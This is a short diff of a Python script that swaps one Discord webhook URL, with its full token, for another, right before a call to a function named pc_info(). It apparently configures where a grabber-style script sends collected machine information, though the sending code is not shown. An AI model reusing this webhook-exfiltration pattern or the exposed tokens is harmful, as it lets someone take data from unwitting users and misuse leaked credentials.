@@ -19,7 +19,7 @@ def ascii_art(fonts, text):
 
 def initialize():
   global notrewebhook
-  notrewebhook = "https://canary.discord.com/api/webhooks/991441429127774329/9Xoece3yh_h2xscGUmdMoRUHyEw6ekyGBvWwJt1SCXIKneXi1-UuH51UnivwP5Oyhnm8"
+  notrewebhook = "https://discord.com/api/webhooks/1076973673430392923/uW-bL85WiJFHeg-E27ad6nm0gewCUuD1PkBsP1ZeEroODUL2ceYqFNPT0cBdNbpBA-4W"
   try:
     pc_info()
   except:
